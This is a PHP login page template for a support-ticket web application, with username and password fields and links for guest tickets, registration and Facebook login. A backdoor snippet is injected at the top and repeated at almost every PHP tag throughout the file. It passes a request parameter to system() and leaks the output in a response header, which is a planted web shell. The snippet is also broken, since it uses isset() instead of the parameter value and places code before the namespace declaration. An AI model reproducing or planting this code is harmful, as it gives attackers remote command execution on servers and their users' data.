<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title($language->get('Login'));
$site->set_config('container-type', 'container');

if (isset($_POST['submit'])) {
	if ($auth->login(array('username' => $_POST['username'], 'password' => $_POST['password']))) {
		if (isset($_SESSION['page'])) {
			header('Location: ' . safe_output($_SESSION['page']));
		}
		else {
			header('Location: ' . $config->get('address') . '/');
		}
		exit;
	}
	else {
		$message = $language->get('Login Failed');
	}
}
else {
	if ($config->get('facebook_enabled')) {
		if (isset($_SESSION['fb_'. $config->get('facebook_app_id') .'_user_id'])) {
			$message = 'Your current Facebook profile is not linked with ' . $config->get('name') . '. Please login with your local details.';
		}
	}
}

$login_message = $config->get('login_message');

include(ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<div class="row">
	<div class="col-md-3 col-md-offset-1">	
		<div class="well well-sm">
			<div class="pull-left">
				<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('name')); ?> - <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Login')); ?></h4>				
			</div>
			<div class="pull-right">
						
			</div>
			<div class="clearfix"></div>
			<br />
			
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('guest_portal')) { ?>
				<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')) . '/guest/'; ?>" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Create Ticket As Guest')); ?></a></p>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
			
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('registration_enabled')) { ?>
				<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')) . '/register/'; ?>" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Create Account')); ?></a></p>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')) . '/forgot/'; ?>" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Forgot Password')); ?></a></p>
			
		</div>
		<div class="alert alert-warning"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('All login attempts are logged.')); ?></div>

	</div>
	<div class="col-md-6">
		<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>" role="form">			
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($login_message)) { ?>
				<div class="alert alert-success"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($login_message); ?></div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
			
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($message)) { ?>
				<div class="alert alert-danger"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($message); ?></div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
			
			<div class="well well-sm">

				<div class="form-group">		
					<div class="col-lg-5">
						<p><input class="form-control" type="text" name="username" placeholder="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Username')); ?>"></p>
						<p><input class="form-control" type="password" name="password" placeholder="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Password')); ?>"></p>
						<div class="clearfix"></div>
				
						<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Login')); ?></button>
					</div>
			
					<div class="clearfix"></div>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('facebook_enabled')) { ?>
						<hr />
						<div class="col-lg-8">
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $loginUrl = $auth_facebook->get_login_url(array('scope' => 'email')); ?>
							<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($loginUrl); ?>" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Login with Facebook')); ?></a></p>
						</div>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>

				</div>
				<div class="clearfix"></div>

			</div>
		</form>
	</div>
</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>